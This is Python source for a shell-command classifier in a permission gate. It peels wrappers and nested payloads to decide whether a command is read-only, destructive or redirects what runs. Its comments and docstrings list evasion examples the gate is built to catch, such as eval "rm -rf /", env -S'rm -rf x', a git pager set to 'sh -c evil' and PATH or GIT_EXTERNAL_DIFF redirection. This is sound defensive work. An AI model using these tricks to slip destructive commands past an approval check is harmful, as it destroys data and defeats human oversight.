    A program spelled as a path (``./cat``, ``bin/cat``) never keeps it (WR-55 / IN-01): the classifier
    signs by basename, so ``GIT_EXTERNAL_DIFF=./cat git diff`` would read as ``cat`` while running a
    file the workspace controls. The value must name a command, resolved from PATH."""
    classified = classify_shell(f"{value} {OPERAND_PLACEHOLDER}", settings)
    return bool(classified.segments) and all(
        not any(separator in segment.program for separator in PATH_SEPARATORS)
        and segment.read_only
        and not segment.write_targets
        and not segment.env_redirect
        and not segment.inline_interpreter
        for segment in classified.segments
    )


def _assignment_redirects(token: str, settings: GateSettings) -> bool:
    """Does the ``NAME=value`` assignment ``token`` redirect what runs (D-27)?

    A table name sets it on any value, empty included; the six command-valued names are exempt
    when the value is empty or reads as a read-only command line."""
    name, _, value = token.partition("=")
    name = name.removesuffix("+")  # `PATH+=./d` appends to PATH: it redirects what runs the same way
    if not _is_redirect_env_name(name, settings):
        return False
    if name in COMMAND_VALUED_ENV_VARS:
        return bool(value) and not _value_keeps_tier(value, settings)
    return True


def _assignments_redirect(tokens: Sequence[str], settings: GateSettings) -> bool:
    """True when any of the ``NAME=value`` tokens redirects what runs."""
    return any(_assignment_redirects(token, settings) for token in tokens)


def _variable_name(token: str) -> str | None:
    """The variable name a ``printf -v`` / ``read`` operand names, array subscript dropped."""
    name = token.split("[", 1)[0]
    return name if IDENTIFIER_RE.match(name) else None


def _printf_variable(argv: Sequence[str]) -> str | None:
    """The NAME of ``printf -v NAME`` / ``printf -vNAME``, read off the leading options."""
    index = 1
    while index < len(argv) and argv[index].startswith("-") and argv[index] != "--":
        token = argv[index]
        if token == PRINTF_VARIABLE_FLAG:
            return _variable_name(argv[index + 1]) if index + 1 < len(argv) else None
        if token.startswith(PRINTF_VARIABLE_FLAG):
            return _variable_name(token[len(PRINTF_VARIABLE_FLAG):])
        index += 1
    return None


def _read_variables(argv: Sequence[str]) -> list[str]:
    """Every variable name ``read`` assigns: its identifier operands and the ``-a`` array."""
    names: list[str] = []
    index = 1
    options_done = False
    while index < len(argv):
        token = argv[index]
        index += 1
        if not options_done and token == "--":
            options_done = True
            continue
        if not options_done and token.startswith("-") and token != "-":
            for position, letter in enumerate(token[1:], start=1):
                flag = f"-{letter}"
                if flag != READ_ARRAY_FLAG and flag not in READ_VALUE_FLAGS:
                    continue
                attached = token[position + 1:]
                if attached:
                    value = attached
                elif index < len(argv):
                    value = argv[index]
                    index += 1
                else:
                    value = ""
                if flag == READ_ARRAY_FLAG:
                    name = _variable_name(value)
                    if name:
                        names.append(name)
                break
            continue
        name = _variable_name(token)
        if name:
            names.append(name)
    return names


def _hash_pins_a_path(argv: Sequence[str]) -> bool:
    """``hash -p`` in any option spelling (``-p``, ``-rp``), read off the leading options."""
    for token in argv[1:]:
        if not token.startswith("-") or token == "-" or token == "--":
            return False
        if not token.startswith("--") and HASH_PATH_FLAG[1] in token[1:]:
            return True
    return False


def _has_computed_name(token: str) -> bool:
    """Is this ``NAME=value`` operand's NAME built at run time (``$V``, ``${V}``, ``$(…)``, a backtick)?"""
    name, equals, _ = token.partition("=")
    return bool(equals) and not token.startswith("-") and ("$" in name or "`" in name)


def _sequence_env_redirect(
    argv: Sequence[str], assignments: Sequence[str], settings: GateSettings
) -> bool:
    """Does this command set, for the REST of the shell sequence, a variable that redirects what
    runs (D-28, D-57)?

    ``argv`` is the command after its prefixes; ``assignments`` are the ``K=V`` prefixes the
    command carried. A bare assignment (empty ``argv``) sets them; ``export``/``declare``/
    ``typeset``/``readonly``/``local`` set their ``NAME=value`` operands; ``printf -v`` and
    ``read`` set a variable whose value is unknown, so every table name counts but the excluded
    one; ``hash -p`` pins a program path. Anything else returns False: an inline ``PATH=./d ls``
    applies to that command only and is the inline rule's.
    """
    if not argv:
        return _assignments_redirect(assignments, settings)
    head = argv[0]
    if head in ENV_CARRIER_DECLARERS:
        # WR-56: `export $V=./d` / `export P${x}ATH=./d` set a variable whose NAME is computed. It may be
        # PATH, and the classifier cannot tell, so it counts as redirecting (the way an unknown value does).
        if any(_has_computed_name(t) for t in argv[1:]):
            return True
        return _assignments_redirect([t for t in argv[1:] if ASSIGNMENT_RE.match(t)], settings)
    if head == "printf":
        name = _printf_variable(argv)
        return name is not None and _is_redirect_env_name(name, settings)
    if head == "read":
        return any(_is_redirect_env_name(name, settings) for name in _read_variables(argv))
    if head == "hash":
        return _hash_pins_a_path(argv)
    return False


def _basename(token: str) -> str:
    """Command name without its directory (see :data:`PATH_SEPARATORS`)."""
    for separator in PATH_SEPARATORS:
        token = token.rsplit(separator, 1)[-1]
    return token


def _build(
    argv: list[str], settings: GateSettings, redirect_targets: list[str], cwd: _Cwd | None = None,
    *, program: str = "", env_redirect: bool = False,
) -> tuple[ShellSegment | None, list[ShellSegment], list[str], str | None]:
    """Signature + payload lifting for a peeled argv (PRD §3.2 steps 5, 7, 8). ``program`` is the
    word ``argv[0]`` was shortened from (:attr:`ShellSegment.program`); a caller whose ``argv[0]`` is
    still as written leaves it empty. ``env_redirect`` is the inline-assignment fact for this
    command (D-27): it is passed to every payload lifted from it (D-57)."""
    program = program or argv[0]
    argv = [_basename(argv[0]), *argv[1:]]
    head = argv[0]
    # `git --git-dir=X` repoints the repository exactly as `GIT_DIR=X` does (D-49).
    env_redirect = env_redirect or (
        head == "git" and any(t == "--git-dir" or t.startswith("--git-dir=") for t in argv[1:])
    )
    extras: list[ShellSegment] = []
    cwd = _Cwd() if cwd is None else cwd

    runner = _composing_runner(argv, settings)
    if runner is not None:
        prefix, inner_argv = runner
        host, inner_extras, _, _ = _build(
            inner_argv, settings, redirect_targets, cwd, env_redirect=env_redirect
        )
        if host is None:  # pragma: no cover - inner argv is non-empty by construction
            host = _make_segment(prefix, tuple(argv), settings, redirect_targets, cwd=cwd,
                                 program=program, env_redirect=env_redirect)
        else:
            host = replace(
                host,
                signature=f"{prefix} {host.signature}",
                argv=tuple(argv),
                read_only=False,
                program=program,
            )
        return host, inner_extras, [], head

    payload_argvs: list[list[str]] = []
    payload_texts: list[str] = []
    find_delete = False
    if head in settings.payload_commands:
        if head == FIND_COMMAND:
            payload_argvs, find_delete = _find_payloads(argv)
        else:
            payload = _command_payload(argv)
            if payload:
                payload_argvs.append(payload)

    signature, inline = _signature(argv, settings, find_delete=find_delete)
    inline = inline or _runs_named_program(argv)
    force_destructive = False
    force_read_only = False
    if signature == GIT_CONFIG_SIGNATURE:
        signature, force_destructive, force_read_only = _git_config_facts(argv, settings)
    if signature == GIT_PUSH_SIGNATURE and _pushes_a_ref_deletion(argv):
        signature = GIT_PUSH_DELETE_SIGNATURE
    if head == "git":
        extras.extend(_git_inline_config_segments(argv, settings))

    if _is_shell_interpreter(head, settings):
        payload_texts = _inline_payloads(argv, settings)
    elif head in settings.inline_by_nature and head not in OPAQUE_INLINE_PROGRAMS:
        payload_texts = _inline_by_nature_payload(argv)
    elif head == "trap":
        payload_texts = _trap_payload(argv)

    if head in WRAPPER_INLINE_COMMAND_FLAGS:
        payload_texts = _flag_values(list(argv[1:]), WRAPPER_INLINE_COMMAND_FLAGS[head])
        inline = inline or bool(payload_texts)

    remote = _remote_command(argv)
    if remote is not None:
        tokens, shell_joined = remote
        if tokens and shell_joined:
            payload_texts = [*payload_texts, " ".join(tokens)]
        elif tokens:
            payload_argvs = [*payload_argvs, tokens]
        inline = True

    for payload in payload_argvs:
        segment, more, _, _ = _build(payload, settings, [], cwd, env_redirect=env_redirect)
        if segment is not None:
            extras.append(segment)
        extras.extend(more)
    for payload_text in payload_texts:
        payload_cwd = cwd.copy()
        payload_cwd.env_redirect = payload_cwd.env_redirect or env_redirect
        # CR-01 / WR-54: the shell that runs the payload joins its continuations (and drops its comments).
        inner_segments, _ = _classify_command_text(payload_text, settings, payload_cwd)
        extras.extend(inner_segments)

    host = _make_segment(
        signature,
        tuple(argv),
        settings,
        redirect_targets,
        cwd=cwd,
        inline=inline,
        payload_lifted=bool(payload_argvs or payload_texts),
        force_destructive=force_destructive,
        force_read_only=force_read_only,
        program=program,
        env_redirect=env_redirect,
    )
    return host, extras, [], head


def _make_segment(
    signature: str,
    argv: tuple[str, ...],
    settings: GateSettings,
    redirect_targets: list[str],
    *,
    cwd: _Cwd | None = None,
    inline: bool = False,
    payload_lifted: bool = False,
    force_destructive: bool = False,
    force_read_only: bool = False,
    program: str = "",
    env_redirect: bool = False,
) -> ShellSegment:
    """Assemble the segment: destructive/read-only verdict plus step 8's write targets.

    ``env_redirect`` is the inline-assignment fact; the shell sequence's carried one
    (:attr:`_Cwd.env_redirect`) is OR'd in here, so the segment records one fact (D-27, D-55).

    ``force_destructive`` / ``force_read_only`` are for facts that cannot be read off a signature
    set because the signature is built from the command's own arguments — ``git config
    core.hooksPath`` is destructive and ``git config --get x`` is read-only, and neither key can be
    enumerated in advance.
    """
    env_redirect = env_redirect or bool(cwd is not None and cwd.env_redirect)
    written = list(redirect_targets) + _write_targets(signature, argv, settings)
    resolved = [_resolve_target(cwd or _Cwd(), target) for target in written]
    targets = [target for target, _ in resolved]
    # A BARE command name in the destructive set condemns every spelling of it: `docker` is
    # there, so `docker exec …` and `docker run …` are destructive too (finding R9 — the
    # subcommand key made them merely unfamiliar, and therefore grantable). A flagged entry like
    # `rm -rf` says nothing about plain `rm`, which is the point of critic finding 12.
    destructive = (
        force_destructive
        or signature == UNPARSED_SHELL_SIGNATURE
        or signature in settings.destructive_signatures
        or signature.split(" ", 1)[0] in settings.destructive_signatures
        or _dotted_variant(signature.split(" ", 1)[0]) in settings.destructive_signatures
    )
    read_only = (
        (force_read_only or signature in settings.read_only_signatures)
        and not destructive
        and not payload_lifted
        and not inline
        and not env_redirect
    )
    # Owner ruling 2026-09-11: `auto` allows a destructive verb whose danger is entirely its
    # target when every target lands inside the project. Resolved through the same `cd` tracking
    # the write targets use, and kept in its OWN fields — `rm` does not write its operands, it
    # deletes them, and folding the two together would change what `guarded` asks about.
    operands = destructive_targets(signature, argv, settings) if destructive else None
    scoped_targets: tuple[str, ...] = ()
    scoped_unresolvable = False
    if operands is not None:
        resolved_operands = [_resolve_target(cwd or _Cwd(), target) for target in operands]
        scoped_targets = tuple(target for target, _ in resolved_operands)
        scoped_unresolvable = (
            not scoped_targets
            or any(unresolvable for _, unresolvable in resolved_operands)
            or any(
                any(bad in target for bad in UNRESOLVABLE_TARGET_CHARS)
                for target in scoped_targets
            )
        )
    return ShellSegment(
        signature=signature,
        argv=argv,
        read_only=read_only,
        destructive=destructive,
        inline_interpreter=inline,
        write_targets=tuple(targets),
        unresolvable_write=any(unresolvable for _, unresolvable in resolved) or any(
            any(bad in target for bad in UNRESOLVABLE_TARGET_CHARS) for target in targets
        ),
        target_scoped_destructive=operands is not None,
        destructive_targets=scoped_targets,
        unresolvable_destructive=scoped_unresolvable,
        env_redirect=env_redirect,
        program=program,
    )


ENV_SPLIT_LONG = "split-string"
ENV_UNPARSED_SPLIT = UNPARSED_SHELL_SIGNATURE
"""A word standing in for an ``env -S`` string that cannot be split. It is the unparsed-shell placeholder
(destructive, ungrantable, asked about by ``auto`` too), not an unfamiliar name: an unfamiliar program
is silent in ``auto`` and the string may hold anything (WR-52)."""


def _env_split_string(rest: list[str], index: int) -> tuple[list[str], int] | None:
    """CR-53: the words ``env -S STR`` / ``--split-string[=STR]`` runs, and the index after the option.

    ``env`` re-parses STR as a command line and runs it, so ``env -S'rm -rf x'`` runs ``rm`` although
    the argv holds no ``rm`` token. The option may be a getopt prefix of the long name (``--split``,
    ``--s``) or sit last in a short cluster (``-iS'…'``); the string is attached or the next token.
    Returns None when ``rest[index]`` is not that option. A string that cannot be split gives the
    unfamiliar placeholder word, never an empty list.
    """
    token = rest[index]
    value: str | None = None
    if token.startswith("--") and len(token) > 2:
        name, equals, attached = token[2:].partition("=")
        if not name or not ENV_SPLIT_LONG.startswith(name):
            return None
        if equals:
            value = attached
    elif token.startswith("-") and len(token) > 1:
        for position, letter in enumerate(token[1:], start=1):
            if letter == "S":
                value = token[position + 1 :] or None
                break
            if letter not in "iv0":
                return None
    else:
        return None
    consumed = index + 1
    if value is None:
        if consumed >= len(rest):
            return [], consumed
        value = rest[consumed]
        consumed += 1
    words = _env_split_words(value)
    return (words if words is not None else [ENV_UNPARSED_SPLIT]), consumed


ENV_SPLIT_ESCAPES = frozenset("\\\"'$#_")
"""The escapes ``env -S`` reads that the splitter understands: ``\\_`` is a blank (WR-52), the rest are
the quoting ones. ``\\c`` (end of string), ``\\n`` and the other control escapes, and a ``${VAR}`` expansion
change what runs in ways the classifier does not follow, so a string using one is unparseable."""


ENV_SPLIT_COMMENT_RE = re.compile(r"(?:^|[ \t\r\n])#")


def _env_split_words(value: str) -> list[str] | None:
    """The words of an ``env -S`` string, or None when it uses something the classifier cannot follow."""
    if "${" in value:
        return None
    # CR-04 (it4): env treats a `#` at a word start as a comment up to the next newline (the text after it
    # runs) and `\f` / `\v` as blanks; `shlex` does neither, so a string using one reads as another command.
    if "\x0b" in value or "\x0c" in value or ENV_SPLIT_COMMENT_RE.search(value.replace("\\_", " ")):
        return None
    pairs = re.findall(r"\\(.?)", value)
    if any(second not in ENV_SPLIT_ESCAPES for second in pairs):
        return None
    try:
        return shlex.split(re.sub(r"\\(.)", lambda m: " " if m.group(1) == "_" else m.group(0), value))
    except ValueError:
        return None


ENV_LONG_VALUE_OPTIONS = ("unset", "chdir", "argv0")
ENV_SHORT_VALUE_OPTIONS = "uCaP"
ENV_SHORT_FLAGS = "iv0"


def _env_value_option(rest: list[str], index: int) -> tuple[int, str, str] | None:
    """WR-02: an ``env`` option that takes a value — (tokens used, option, value), else None.

    ``-u NAME``, ``-C DIR``, ``-a NAME``, ``-P PATH`` and their long forms ``--unset``, ``--chdir``,
    ``--argv0`` (any unique getopt prefix, ``=VALUE`` attached or the next token). A short one may sit
    last in a cluster (``-iC DIR``) or carry its value (``-CDIR``). Without this the value is read as
    the command ``env`` runs and the real command is never classified.
    """
    token = rest[index]
    if token.startswith("--") and len(token) > 2:
        name, equals, attached = token[2:].partition("=")
        option = next((f"--{long}" for long in ENV_LONG_VALUE_OPTIONS if name and long.startswith(name)), None)
        if option is None:
            return None
        if equals:
            return 1, option, attached
    elif token.startswith("-") and len(token) > 1:
        for position, letter in enumerate(token[1:], start=1):
            if letter in ENV_SHORT_VALUE_OPTIONS:
                option = f"-{letter}"
                if token[position + 1 :]:
                    return 1, option, token[position + 1 :]
                break
            if letter not in ENV_SHORT_FLAGS:
                return None
        else:
            return None
    else:
        return None
    has_value = index + 1 < len(rest)
    return (2 if has_value else 1), option, rest[index + 1] if has_value else ""


def _peel(argv: list[str], settings: GateSettings) -> tuple[list[str], list[str], list[str]]:
    """PRD §3.2 step 4: peel wrappers down to the command they wrap.

    ``sudo`` is deliberately absent from ``wrapper_commands``: it keeps its own signature and
    is destructive before any peeling.

    Returns the peeled argv, the ``K=V`` tokens skipped at each FULLY peeled wrapper level
    (D-25), and the directories ``env -C DIR`` / ``--chdir`` moved the wrapped command to
    (WR-02). Every early return of the argv unchanged — no wrapped command, a required subcommand
    missing — carries only what levels already peeled contributed, so ``env NAME=v`` with
    nothing to run reports none and the ``env`` segment (which prints the environment) stays
    read-only (D-57).
    """
    assignments: list[str] = []
    directories: list[str] = []
    while len(argv) > 1 and argv[0] in settings.wrapper_commands:
        head, rest = argv[0], argv[1:]
        value_flags = WRAPPER_HEAD_VALUE_FLAGS.get(head, WRAPPER_VALUE_FLAGS)
        skips = WRAPPER_POSITIONAL_SKIPS.get(head, 0)
        index = 0
        level: list[str] = []
        level_directories: list[str] = []
        while index < len(rest):
            token = rest[index]
            if head == "env" and token.startswith("-"):
                split = _env_split_string(rest, index)
                if split is not None:
                    words, after = split
                    rest = [*rest[:index], *words, *rest[after:]]
                    continue
                valued = _env_value_option(rest, index)
                if valued is not None:
                    used, option, value = valued
                    if option in ("-C", "--chdir"):
                        level_directories.append(value)
                    index += used
                    continue
            if ASSIGNMENT_RE.match(token):
                level.append(token)
                index += 1
                continue
            if head == "time" and token == "!":
                index += 1  # `time ! cmd` negates the pipeline; the command is what follows
                continue
            if token.startswith("-") and token != "-":
                index += 2 if token in value_flags else 1
                continue
            if head in WRAPPER_NUMERIC_ARG and DURATION_RE.match(token):
                index += 1
                continue
            if skips:
                skips -= 1
                index += 1
                continue
            break
        required = WRAPPER_SUBCOMMANDS.get(head)
        if required is not None:
            if index >= len(rest) or rest[index] not in required:
                return argv, assignments, directories
            index += 1
        if index >= len(rest):
            return argv, assignments, directories
        assignments.extend(level)
        directories.extend(level_directories)
        argv = rest[index:]
    return argv, assignments, directories


def _composing_runner(
    argv: list[str], settings: GateSettings
) -> tuple[str, list[str]] | None:
    """``uv run CMD …`` → (``"uv run"``, CMD argv). See :data:`COMPOSING_RUNNERS`."""
    for runner in COMPOSING_RUNNERS:
        prefix = runner.split()
        if argv[: len(prefix)] != prefix:
            continue
        index = len(prefix)
        while index < len(argv):
            token = argv[index]
            if token.startswith("-"):
                index += 2 if token in UV_RUN_VALUE_FLAGS else 1
                continue
            break
        if index < len(argv) and argv[index] not in settings.dropped_commands:
            return runner, argv[index:]
    return None


def _find_payloads(argv: list[str]) -> tuple[list[list[str]], bool]:
    """PRD §3.2 step 5: ``find -exec/-execdir/-ok CMD … ;|+`` payloads, and ``-delete``."""
    payloads: list[list[str]] = []
    delete = False
    index = 1
    while index < len(argv):
        token = argv[index]
        if token == "-delete":
            delete = True
            index += 1
            continue
        if token in FIND_PAYLOAD_PRIMARIES:
            index += 1
            payload: list[str] = []
            while index < len(argv) and argv[index] not in FIND_PAYLOAD_TERMINATORS:
                payload.append(argv[index])
                index += 1
            index += 1
            if payload:
                payloads.append(payload)
            continue
        index += 1
    return payloads, delete


def _remote_command(argv: list[str]) -> tuple[list[str], bool] | None:
    """The command ``ssh``/``docker exec`` will run elsewhere — (tokens, the remote side is a
    shell) — or None if this is neither.

    The token list is empty for a remote shell with no command (``ssh host``): still code under
    this key, just none of it visible here. See :data:`REMOTE_EXEC_COMMANDS` (finding R9).
    """
    entry = REMOTE_EXEC_COMMANDS.get(argv[0])
    if entry is None:
        return None
    prefix, value_flags, shell_joined = entry
    rest = argv[1:]
    if prefix:
        if tuple(rest[: len(prefix)]) != prefix:
            return None
        rest = rest[len(prefix):]
    index = 0
    while index < len(rest):
        token = rest[index]
        if token.startswith("-") and token != "-":
            index += 2 if token in value_flags else 1
            continue
        break
    return (rest[index + 1:] if index < len(rest) else []), shell_joined


def _command_payload(argv: list[str]) -> list[str]:
    """PRD §3.2 step 5: the command a payload runner will run — its first non-option token onward.

    The rule for every member of ``settings.payload_commands`` except ``find`` (whose payload sits
    behind a primary). Options and their values are skipped per :data:`PAYLOAD_VALUE_FLAGS`, and
    the argument list GNU parallel appends after :data:`PAYLOAD_ARGUMENT_SEPARATORS` is data, not
    part of the command. Empty when the runner falls back to its default (``xargs`` → ``echo``).

    Generic on purpose (finding R9b): adding ``parallel`` to ``payload_commands`` in config has to
    be enough to lift ``parallel rm -rf {} ::: a b``, with no code change here.
    """
    value_flags = PAYLOAD_VALUE_FLAGS.get(argv[0], frozenset())
    index = 1
    while index < len(argv):
        token = argv[index]
        if token.startswith("-") and token != "-":
            index += 2 if token in value_flags else 1
            continue
        break
    payload = argv[index:]
    for separator in PAYLOAD_ARGUMENT_SEPARATORS:
        if separator in payload:
            payload = payload[: payload.index(separator)]
    return payload


def _inline_payloads(argv: list[str], settings: GateSettings) -> list[str]:
    """PRD §3.2 step 5: the string after ``sh -c`` / ``bash -c`` / ``zsh -c``, to recurse into."""
    flags = settings.inline_code_flags.get(argv[0], ())
    fold = argv[0] in CASE_FOLDED_FLAG_INTERPRETERS
    payloads: list[str] = []
    for index, token in enumerate(argv[1:], start=1):
        if _inline_flag(token, flags, fold=fold) and index + 1 < len(argv):
            payloads.append(argv[index + 1])
    return payloads


def _inline_by_nature_payload(argv: list[str]) -> list[str]:
    """``eval ARGS`` → the shell text it will run (critic finding F4).

    ``eval`` takes its code as plain arguments and joins them with a space before running them,
    exactly as ``bash -c`` runs its one string — so the arguments are joined and recursed into by
    the same path. ``eval "rm -rf /"`` is an `rm -rf` segment plus the `eval`; an argument that is
    only a variable (``eval $CMD``) recurses to an unfamiliar segment, which is what ``bash -c
    "$CMD"`` already does, because neither one can be resolved without running it.
    """
    text = " ".join(argv[1:]).strip()
    return [text] if text else []


def _trap_payload(argv: list[str]) -> list[str]:
    """``trap 'CMD' SIGNAL…`` → CMD, the shell text that runs when the signal arrives (CR-05, WR-55).

    The first operand after the options (``-l``, ``-p``, ``--``) is the action; ``-`` resets the trap
    and an empty one ignores the signal, so neither runs anything."""
    index = 1
    while index < len(argv) and argv[index].startswith("-") and argv[index] != "-":
        index += 1
    if index >= len(argv) or argv[index] in ("", "-"):
        return []
    return [argv[index]]


def _inline_flag(token: str, flags: tuple[str, ...], *, fold: bool = False) -> str | None:
    """The inline-code flag this token carries, or None.

    Short flags cluster: ``bash -lc "rm -rf x"`` is ``bash -c`` with a login shell, and reading
    only exact matches would file it as ``bash <script>`` and never recurse into the payload.

    ``fold`` switches to the Windows shells' own matching — case-insensitive, any unambiguous
    prefix, canonical spelling returned (:data:`CASE_FOLDED_FLAG_INTERPRETERS`).
    """
    if token in flags:
        return token
    if fold:
        lowered = token.lower()
        if len(token) < 2:
            return None
        return next((flag for flag in flags if flag.lower().startswith(lowered)), None)
    if token.startswith("-") and not token.startswith("--"):
        for flag in flags:
            if len(flag) == 2 and flag[1] in token[1:]:
                return flag
    return None


def _signature(
    argv: list[str], settings: GateSettings, *, find_delete: bool = False
) -> tuple[str, bool]:
    """PRD §3.2 step 7: the grant key for a peeled command, and whether it runs inline code.

    First token, plus the subcommand for ``settings.subcommand_tools``, plus the interpreter
    mode for ``settings.interpreter_commands``, plus the canonical destructive flags for
    ``settings.destructive_flag_verbs``.
    """
    head = argv[0]
    rest = argv[1:]

    if find_delete:
        return FIND_DELETE_SIGNATURE, False

    base = head
    if head in settings.subcommand_tools:
        found = _first_subcommand(head, rest)
        if found:
            subcommand, after = found
            base = f"{head} {subcommand}"
            if subcommand in NESTED_SUBCOMMAND_GROUPS.get(head, frozenset()):
                nested = _first_subcommand(head, after)
                if nested:
                    base = f"{base} {nested[0]}"
            else:
                operation = _operation_word(base, after)
                if operation:
                    base = f"{base} {operation}"

    if head == "sed":
        for canonical, spellings in SED_MODE_FLAGS:
            if any(
                _matches_flag(token, spellings, SED_ATTACHED_VALUE_LETTERS) for token in rest
            ):
                return f"sed {canonical}", False

    if head in settings.source_commands:
        # `source FILE` / `. FILE` runs the file's contents in THIS shell. Nothing on the command
        # line says what that is, so it is an inline interpreter keyed like `python3 <script>`
        # (critic finding F3b). The file is not read here — the classifier is pure.
        target = next((token for token in rest if not token.startswith("-")), None)
        signature = f"{SOURCE_SIGNATURE} {SCRIPT_PLACEHOLDER}" if target else SOURCE_SIGNATURE
        return signature, True

    if head in settings.inline_by_nature:
        return base, True

    if head in settings.interpreter_commands or base in settings.interpreter_commands:
        key = base if base in settings.interpreter_commands else head
        mode, inline = _interpreter_mode(key, rest, settings)
        if mode:
            return f"{key} {mode}", inline
        return key, False

    verb, _ = _destructive_verb(base, settings)
    flags = _destructive_flags(base, rest, settings)
    return verb + flags, False


def _interpreter_mode(
    key: str, rest: list[str], settings: GateSettings
) -> tuple[str, bool]:
    """``-c`` (inline), ``-m MOD``, ``<script>`` or nothing — the four keys of critic finding 5."""
    inline_flags = settings.inline_code_flags.get(key, ())
    if key in CASE_FOLDED_FLAG_INTERPRETERS:
        # The inline flag can sit behind an option that takes a value, and need not start with a
        # dash at all (`cmd /c`), so it is looked for everywhere before the positional rule.
        found = next(
            (flag for flag in (_inline_flag(token, inline_flags, fold=True) for token in rest)
             if flag),
            None,
        )
        if found:
            return found, True
    index = 0
    while index < len(rest):
        token = rest[index]
        flag = _inline_flag(token, inline_flags)
        if flag:
            return flag, True
        if token == "-m" and index + 1 < len(rest):
            return f"-m {rest[index + 1]}", False
        if not token.startswith("-"):
            return SCRIPT_PLACEHOLDER, False
        index += 1
    return "", False


def _git_config_facts(argv: list[str], settings: GateSettings) -> tuple[str, bool, bool]:
    """``git config …`` → (signature, destructive, read_only) — critic finding F3(a).

    A WRITE to a key in ``settings.git_config_dangerous_keys`` repoints what git will execute on
    some later command, so it is destructive and therefore ungrantable: the signature carries the
    key (``git config core.hooksPath``) because that is the thing the human is being asked about.
    Any other write keeps the plain ``git config`` key and stays grantable; a read
    (``--get``, ``--list``, ``-l``, ``git config KEY`` with no value) is read-only and never asks.
    """
    try:
        tokens = argv[argv.index("config") + 1:]
    except ValueError:  # pragma: no cover - only reached with the "git config" signature
        return GIT_CONFIG_SIGNATURE, False, False

    write = False
    key: str | None = None
    index = 0
    while index < len(tokens):
        token = tokens[index]
        name = token.split("=", 1)[0]
        if name in GIT_CONFIG_VALUE_FLAGS:
            index += 1 if "=" in token else 2
            continue
        if token.startswith("-"):
            write = write or name in GIT_CONFIG_WRITE_FLAGS
            index += 1
            continue
        if key is None and token in GIT_CONFIG_WRITE_SUBCOMMANDS:
            write = True
        elif key is None and token in GIT_CONFIG_READ_SUBCOMMANDS:
            pass
        elif key is None:
            key = token
        else:
            # A second positional is the VALUE the key is being set to.
            write = True
        index += 1

    if write and key and _is_dangerous_git_key(key, settings):
        return f"{GIT_CONFIG_SIGNATURE} {key}", True, False
    return GIT_CONFIG_SIGNATURE, False, not write


def _git_inline_config_segments(
    argv: list[str], settings: GateSettings
) -> list[ShellSegment]:
    """``git -c key=value CMD`` / ``git --config-env=key=VAR CMD`` (:data:`GIT_INLINE_CONFIG_FLAG`).

    A dangerous key becomes its own destructive segment so the host command keeps its own
    signature: ``git -c core.pager='sh -c evil' log`` is still a ``git log``, and it is also a
    config write that nobody would see if the two facts were merged.
    """
    keys: list[str] = []
    index = 1
    while index < len(argv):
        token = argv[index]
        if token == GIT_INLINE_CONFIG_FLAG and index + 1 < len(argv):
            keys.append(argv[index + 1].split("=", 1)[0])
            index += 2
            continue
        if token.startswith(f"{GIT_INLINE_CONFIG_ENV_FLAG}="):
            keys.append(token.split("=", 1)[1].split("=", 1)[0])
            index += 1
            continue
        if token == GIT_INLINE_CONFIG_ENV_FLAG and index + 1 < len(argv):
            keys.append(argv[index + 1].split("=", 1)[0])
            index += 2
            continue
        index += 1
    return [
        _make_segment(
            f"{GIT_CONFIG_SIGNATURE} {key}",
            ("git", "config", key),
            settings,
            [],
            force_destructive=True,
        )
        for key in keys
        if _is_dangerous_git_key(key, settings)
    ]


def _is_dangerous_git_key(key: str, settings: GateSettings) -> bool:
    """Match one config key against ``settings.git_config_dangerous_keys``.

    ``*`` globs the rest of the key (``url.*.insteadOf`` covers ``url.https://x/.insteadOf``, dots
    and slashes included) and the comparison is case-insensitive, as git treats section and
    variable names.
    """
    lowered = key.lower()
    return any(
        fnmatch.fnmatchcase(lowered, pattern.lower())
        for pattern in settings.git_config_dangerous_keys
    )


def _first_subcommand(head: str, rest: list[str]) -> tuple[str, list[str]] | None:
    """First positional argument and what follows it, skipping global flags and their values.

    The tail is what lets a group take one more word (:data:`NESTED_SUBCOMMAND_GROUPS`); PRD
    §3.2 step 7.
    """
    value_flags = SUBCOMMAND_VALUE_FLAGS.get(head, frozenset())
    index = 0
    while index < len(rest):
        token = rest[index]
        if token.startswith("-"):
            index += 2 if token in value_flags else 1
            continue
        return token, rest[index + 1:]
    return None


def _operation_word(base: str, after: list[str]) -> str:
    """The operation this two-word signature is missing, or ``""`` (:data:`SUBCOMMAND_OPERATION_WORDS`).

    ``after`` is everything past the subcommand. Table order decides, not command-line order, so
    the destructive reading wins when a command carries two spellings.
    """
    for canonical, spellings in SUBCOMMAND_OPERATION_WORDS.get(base, ()):
        if any(_matches_flag(token, spellings) for token in after):
            return canonical
    return ""


def _destructive_verb(base: str, settings: GateSettings) -> tuple[str, tuple[str, ...]]:
    """The ``destructive_flag_verbs`` entry for this command — (canonical verb, its flags).

    The verb is returned because it may be spelled differently from ``base``: PowerShell and cmd
    are case-insensitive about command names as well as flags, so ``remove-item -recurse -force x``
    is ``Remove-Item -Recurse -Force`` and has to reach the same key (v0.14 critic A4). Folding is
    limited to the entries whose flags carry their own lead character (:data:`SPELLED_FLAG_LEADERS`)
    — the POSIX verbs stay case-sensitive, where ``R`` and ``r`` are different flags and ``RM`` is
    not ``rm``.
    """
    canonical = settings.destructive_flag_verbs.get(base)
    if canonical is not None:
        return base, canonical
    lowered = base.lower()
    for verb, flags in settings.destructive_flag_verbs.items():
        if verb.lower() == lowered and _is_spelled_flag_verb(flags):
            return verb, flags
    return base, ()


def _is_spelled_flag_verb(canonical: tuple[str, ...]) -> bool:
    """Does this entry spell its flags in full, lead character included? :data:`SPELLED_FLAG_LEADERS`"""
    return bool(canonical) and all(flag[:1] in SPELLED_FLAG_LEADERS for flag in canonical)


def _spelled_flags(canonical: tuple[str, ...], rest: list[str]) -> str:
    """Windows flag suffix: the flags found, in the verb's own order, spelled as the table spells
    them (``Remove-Item -Recurse -Force``).

    A dash flag matches case-insensitively by PREFIX, because PowerShell accepts any unambiguous
    abbreviation (``-r``, ``-rec``, ``-Recurse``); a slash flag matches folded but whole, because
    cmd's do not abbreviate. A bare ``-`` matches nothing.
    """
    found = [
        flag for flag in canonical
        if any(_matches_spelled_flag(token, flag) for token in rest)
    ]
    return "".join(f" {flag}" for flag in found)


def _matches_spelled_flag(token: str, flag: str) -> bool:
    """One token against one fully-spelled Windows flag (see :func:`_spelled_flags`)."""
    if flag.startswith("-"):
        return len(token) > 1 and flag.lower().startswith(token.lower())
    return token.lower() == flag.lower()


def _destructive_flags(base: str, rest: list[str], settings: GateSettings) -> str:
    """Canonical flag suffix for a verb in ``settings.destructive_flag_verbs``, else ``""``."""
